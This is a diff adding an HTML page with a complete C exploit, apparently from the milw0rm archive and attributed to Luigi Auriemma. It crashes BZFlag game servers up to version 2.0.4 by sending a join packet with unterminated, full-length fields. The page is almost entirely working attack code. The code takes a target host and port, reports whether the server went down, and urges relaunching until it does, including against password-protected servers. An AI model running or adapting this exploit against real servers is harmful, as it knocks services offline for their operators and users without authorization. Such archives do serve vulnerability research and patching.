@@ -1,0 +1,373 @@
+<html>
+<head>
+<title>BZFlag <= 2.0.4 (undelimited string) Denial of Service Exploit</title>
+<pre>
+/*
+
+by Luigi Auriemma
+
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdarg.h&gt;
+#include &lt;time.h&gt;
+
+#ifdef WIN32
+    #include &lt;winsock.h&gt;
+/*
+   Header file used for manage errors in Windows
+   It support socket and errno too
+   (this header replace the previous sock_errX.h)
+*/
+
+#include &lt;string.h&gt;
+#include &lt;errno.h&gt;
+
+
+
+void std_err(void) {
+    char    *error;
+
+    switch(WSAGetLastError()) {
+        case 10004: error = &quot;Interrupted system call&quot;; break;
+        case 10009: error = &quot;Bad file number&quot;; break;
+        case 10013: error = &quot;Permission denied&quot;; break;
+        case 10014: error = &quot;Bad address&quot;; break;
+        case 10022: error = &quot;Invalid argument (not bind)&quot;; break;
+        case 10024: error = &quot;Too many open files&quot;; break;
+        case 10035: error = &quot;Operation would block&quot;; break;
+        case 10036: error = &quot;Operation now in progress&quot;; break;
+        case 10037: error = &quot;Operation already in progress&quot;; break;
+        case 10038: error = &quot;Socket operation on non-socket&quot;; break;
+        case 10039: error = &quot;Destination address required&quot;; break;
+        case 10040: error = &quot;Message too long&quot;; break;
+        case 10041: error = &quot;Protocol wrong type for socket&quot;; break;
+        case 10042: error = &quot;Bad protocol option&quot;; break;
+        case 10043: error = &quot;Protocol not supported&quot;; break;
+        case 10044: error = &quot;Socket type not supported&quot;; break;
+        case 10045: error = &quot;Operation not supported on socket&quot;; break;
+        case 10046: error = &quot;Protocol family not supported&quot;; break;
+        case 10047: error = &quot;Address family not supported by protocol family&quot;; break;
+        case 10048: error = &quot;Address already in use&quot;; break;
+        case 10049: error = &quot;Can't assign requested address&quot;; break;
+        case 10050: error = &quot;Network is down&quot;; break;
+        case 10051: error = &quot;Network is unreachable&quot;; break;
+        case 10052: error = &quot;Net dropped connection or reset&quot;; break;
+        case 10053: error = &quot;Software caused connection abort&quot;; break;
+        case 10054: error = &quot;Connection reset by peer&quot;; break;
+        case 10055: error = &quot;No buffer space available&quot;; break;
+        case 10056: error = &quot;Socket is already connected&quot;; break;
+        case 10057: error = &quot;Socket is not connected&quot;; break;
+        case 10058: error = &quot;Can't send after socket shutdown&quot;; break;
+        case 10059: error = &quot;Too many references, can't splice&quot;; break;
+        case 10060: error = &quot;Connection timed out&quot;; break;
+        case 10061: error = &quot;Connection refused&quot;; break;
+        case 10062: error = &quot;Too many levels of symbolic links&quot;; break;
+        case 10063: error = &quot;File name too long&quot;; break;
+        case 10064: error = &quot;Host is down&quot;; break;
+        case 10065: error = &quot;No Route to Host&quot;; break;
+        case 10066: error = &quot;Directory not empty&quot;; break;
+        case 10067: error = &quot;Too many processes&quot;; break;
+        case 10068: error = &quot;Too many users&quot;; break;
+        case 10069: error = &quot;Disc Quota Exceeded&quot;; break;
+        case 10070: error = &quot;Stale NFS file handle&quot;; break;
+        case 10091: error = &quot;Network SubSystem is unavailable&quot;; break;
+        case 10092: error = &quot;WINSOCK DLL Version out of range&quot;; break;
+        case 10093: error = &quot;Successful WSASTARTUP not yet performed&quot;; break;
+        case 10071: error = &quot;Too many levels of remote in path&quot;; break;
+        case 11001: error = &quot;Host not found&quot;; break;
+        case 11002: error = &quot;Non-Authoritative Host not found&quot;; break;
+        case 11003: error = &quot;Non-Recoverable errors: FORMERR, REFUSED, NOTIMP&quot;; break;
+        case 11004: error = &quot;Valid name, no data record of requested type&quot;; break;
+        default: error = strerror(errno); break;
+    }
+    fprintf(stderr, &quot;\nError: %s\n&quot;, error);
+    exit(1);
+}
+
+// combined winerr.h /str0ke
+
+    #define close   closesocket
+#else
+    #include &lt;unistd.h&gt;
+    #include &lt;sys/socket.h&gt;
+    #include &lt;sys/types.h&gt;
+    #include &lt;arpa/inet.h&gt;
+    #include &lt;netinet/in.h&gt;
+    #include &lt;netdb.h&gt;
+#endif
+
+
+
+#define VER         &quot;0.1&quot;
+#define BUFFSZ      0xffff
+#define PORT        5154
+#define TIMEOUT     8
+
+#define WAITSEC     5
+#define CALLSIGNSZ  32
+#define MAILSZ      128
+#define TOKENSZ     22
+#define VERSIONSZ   60
+#define TYPE        &quot;\x00\x00&quot;
+#define TEAM        &quot;\xff\xfe&quot;  // autoteam
+
+
+
+int bzflag_send(int sd, u_char *buff, u_char *code, ...);
+int tcp_recv(int sd, u_char *data, int len);
+u_short bzflag_recv(int sd, u_char *buff, u_char *code);
+int create_rand_string(u_char *data, int len, u_int *seed);
+int timeout(int sock, int secs);
+u_int resolv(char *host);
+void std_err(void);
+
+
+
+int main(int argc, char *argv[]) {
+    struct  sockaddr_in peer;
+    u_int   seed;
+    int     sd;
+    u_short port = PORT,
+            len;
+    u_char  buff[BUFFSZ],
+            callsign[CALLSIGNSZ + 1],
+            mail[MAILSZ + 1],
+            token[TOKENSZ + 1],
+            version[VERSIONSZ + 1],
+            code[2];
+
+#ifdef WIN32
+    WSADATA    wsadata;
+    WSAStartup(MAKEWORD(1,0), &amp;wsadata);
+#endif
+
+
+    setbuf(stdout, NULL);
+
+    fputs(&quot;\n&quot;
+        &quot;BZFlag &lt;= 2.0.4 (2.x) server crash &quot;VER&quot;\n&quot;
+        &quot;by Luigi Auriemma\n&quot;
+        &quot;e-mail: aluigi@autistici.org\n&quot;
+        &quot;web:    http://aluigi.altervista.org\n&quot;
+        &quot;\n&quot;, stdout);
+
+    if(argc &lt; 2) {
+        printf(&quot;\n&quot;
+            &quot;Usage: %s &lt;host&gt; [port(%hu)]\n&quot;
+            &quot;\n&quot;
+            &quot; This tool works also versus servers protected by password without knowing the\n&quot;
+            &quot; keyword!\n&quot;
+            &quot;\n&quot;, argv[0], port);
+        exit(1);
+    }
+
+    if(argc &gt; 2) port = atoi(argv[2]);
+
+    peer.sin_addr.s_addr = resolv(argv[1]);
+    peer.sin_port        = htons(port);
+    peer.sin_family      = AF_INET;
+
+    printf(&quot;- target   %s : %hu\n&quot;,
+        inet_ntoa(peer.sin_addr), port);
+
+    fputs(&quot;- check server version: &quot;, stdout);
+    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if(sd &lt; 0) std_err();
+    if(connect(sd, (struct sockaddr *)&amp;peer, sizeof(peer))
+      &lt; 0) std_err();
+    if(timeout(sd, TIMEOUT) &lt; 0) {
+        printf(&quot;\nError: no reply received within %d seconds, this server doesn't seem valid\n\n&quot;, TIMEOUT);
+        exit(1);
+    }
+    tcp_recv(sd, buff, 9);
+
+    printf(&quot;   %s\n&quot;, buff);
+    if(memcmp(buff, &quot;BZFS&quot;, 4)) {
+        fputs(&quot;- this server doesn't seem a valid BZFlag server, I try to continue\n&quot;, stdout);
+    } else {
+        if(memcmp(buff + 4, &quot;00&quot;, 2)) {
+            fputs(&quot;- this server uses a version which is not vulnerable, I try to continue\n&quot;, stdout);
+        }
+    }
+
+    if(!timeout(sd, 0)) {   // 2.0.4 sends data while the previous 2.0 not
+        len = bzflag_recv(sd, buff, code);
+    }
+
+    create_rand_string(callsign, CALLSIGNSZ, &amp;seed);    // &lt;=== THE BUG IS HERE
+    create_rand_string(mail,     MAILSZ,     &amp;seed);
+    create_rand_string(token,    TOKENSZ,    &amp;seed);
+    create_rand_string(version,  VERSIONSZ,  &amp;seed);
+
+    bzflag_send(sd,
+        buff,
+        &quot;en&quot;,
+        2,          TYPE,
+        2,          TEAM,
+        CALLSIGNSZ, callsign,
+        MAILSZ,     mail,
+        TOKENSZ,    token,
+        VERSIONSZ,  version,
+        0);
+
+    len = bzflag_recv(sd, buff, code);
+
+    if(memcmp(code, &quot;ac&quot;, 2)) {
+        buff[len] = 0;
+        printf(&quot;\n&quot;
+            &quot;Error: code \&quot;%.2s\&quot;\n&quot;
+            &quot;%s\n&quot;
+            &quot;\n&quot;,
+            code, buff + 2);
+    }
+
+    close(sd);
+
+    fputs(&quot;- check server:\n&quot;, stdout);
+    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if(sd &lt; 0) std_err();
+    if(
+      (connect(sd, (struct sockaddr *)&amp;peer, sizeof(peer)) &lt; 0) ||
+      (timeout(sd, 3) &lt; 0)) {
+        fputs(&quot;\n  Server IS vulnerable!!!\n\n&quot;, stdout);
+    } else {
+        fputs(&quot;\n&quot;
+            &quot;  Server doesn't seem vulnerable\n&quot;
+            &quot;  RELAUNCH THIS TOOL OTHER TIMES UNTIL YOU ARE UNABLE TO CRASH IT!!!\n&quot;
+            &quot;\n&quot;, stdout);
+    }
+    close(sd);
+    return(0);
+}
+
+
+
+int bzflag_send(int sd, u_char *buff, u_char *code, ...) {
+    va_list ap;
+    int     len;
+    u_short *blen;
+    u_char  *s,
+            *p;
+
+    blen = (u_short *)buff;
+    memcpy(buff + 2, code, 2);
+    p = buff + 4;
+
+    va_start(ap, code);
+    while((len = va_arg(ap, int))) {
+        s = va_arg(ap, u_char *);
+        memcpy(p, s, len);
+        p += len;
+    }
+    va_end(ap);
+
+    *blen = htons(p - (buff + 4));
+
+    len = send(sd, buff, p - buff, 0);
+    return(len);
+}
+
+
+
+int tcp_recv(int sd, u_char *data, int len) {
+    int     t;
+
+    while(len) {
+        t = recv(sd, data, len, 0);
+        if(t &lt;= 0) return(-1);
+        data += t;
+        len  -= t;
+    }
+
+    return(0);
+}
+
+
+
+u_short bzflag_recv(int sd, u_char *buff, u_char *code) {
+    u_short len;
+
+    tcp_recv(sd, (u_char *)&amp;len, 2);
+    len = ntohs(len);
+
+    tcp_recv(sd, code, 2);
+
+    tcp_recv(sd, buff, len);
+
+    return(len);
+}
+
+
+
+int create_rand_string(u_char *data, int len, u_int *seed) {
+    u_int   rnd;
+    u_char  *p = data;
+    const static u_char table[] =
+                &quot;0123456789&quot;
+                &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;
+                &quot;abcdefghijklmnopqrstuvwxyz&quot;;
+
+    rnd = *seed;
+//    len = rnd % len;  // max length!
+//    if(len &lt; 3) len = 3;
+
+    while(len--) {
+        rnd = (rnd * 0x343FD) + 0x269EC3;
+        *p++ = table[rnd % (sizeof(table) - 1)];
+    }
+    *p = 0;
+
+    *seed = rnd;
+    return(p - data);
+}
+
+
+
+int timeout(int sock, int secs) {
+    struct  timeval tout;
+    fd_set  fd_read;
+    int     err;
+
+    tout.tv_sec  = secs;
+    tout.tv_usec = 1000;    // in case secs is 0
+    FD_ZERO(&amp;fd_read);
+    FD_SET(sock, &amp;fd_read);
+    err = select(sock + 1, &amp;fd_read, NULL, NULL, &amp;tout);
+    if(err &lt; 0) std_err();
+    if(!err) return(-1);
+    return(0);
+}
+
+
+
+u_int resolv(char *host) {
+    struct hostent *hp;
+    u_int host_ip;
+
+    host_ip = inet_addr(host);
+    if(host_ip == INADDR_NONE) {
+        hp = gethostbyname(host);
+        if(!hp) {
+            printf(&quot;\nError: Unable to resolv hostname (%s)\n&quot;, host);
+            exit(1);
+        } else host_ip = *(u_int *)hp-&gt;h_addr;
+    }
+    return(host_ip);
+}
+
+
+
+#ifndef WIN32
+    void std_err(void) {
+        perror(&quot;\nError&quot;);
+        exit(1);
+    }
+#endif
+
+// milw0rm.com [2005-12-27]
+</pre>
+</html>
+
